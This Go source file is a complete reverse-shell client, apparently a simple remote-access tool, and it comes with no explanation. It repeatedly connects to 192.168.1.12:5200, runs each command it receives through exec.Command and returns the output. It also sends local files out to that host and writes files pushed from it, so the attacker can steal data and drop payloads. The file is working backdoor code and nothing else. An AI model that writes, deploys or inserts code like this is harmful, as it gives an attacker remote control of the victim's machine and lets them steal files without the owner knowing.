package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {

	command := ""

	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))

	if err != nil {
		for {
			conn, err = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))

			if err == nil {
				break
			}

			time.Sleep(2 * time.Second)
		}

	} else {
	}

	shell(conn, command)
}

func shell(conn net.Conn, command string) {

	for {

		command = recieve_data(conn)

		_command := ""

		for i := 1; i < len(command)-1; i++ {
			_command += string(command[i])
		}

		if _command == "quit" {
			return
		} else if len(_command) >= 3 && _command[:3] == "cd " {
			os.Chdir(_command[3:])

		} else if len(_command) >= 8 && _command[:8] == "download" {
			upload_file(_command[9:], conn)
			conn.Close()
			time.Sleep(1 * time.Second)

			conn, _ = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))

		} else if len(_command) >= 6 && _command[:6] == "upload" {
			download_file(_command[7:], conn)
			conn.Close()
			time.Sleep(1 * time.Second)

			conn, _ = net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))

		}

		send_data(conn, basic_commants(_command))

	}
}

func send_data(conn net.Conn, command_output string) {
	jsondata, _ := json.Marshal(command_output)
	conn.Write([]byte(jsondata))
}

func recieve_data(conn net.Conn) string {

	var buffer []byte = make([]byte, 1024)
	cargo, _ := conn.Read(buffer)

	return string(buffer[:cargo])

}

func basic_commants(command string) string {

	cmd := exec.Command(command)

	str, _ := cmd.Output()

	return string(bytes.ReplaceAll(str, []byte{10}, []byte{32}))
}

func upload_file(command string, conn net.Conn) {

	var buffer = make([]byte, 1024)
	file, _ := os.Open(command)

	for {
		cargo, err := file.Read(buffer)

		conn.Write([]byte(buffer[:cargo]))
		if err != nil {
			break
		}
	}
	file.Close()
}

func download_file(command string, conn net.Conn) {

	var buffer []byte = make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	file, _ := os.Create(command)

	for {
		cargo, err1 := conn.Read(buffer)
		file.Write([]byte(buffer[:cargo]))

		if err1 != nil {
			fmt.Println("EOF")
			break
		}
	}
	file.Close()
}
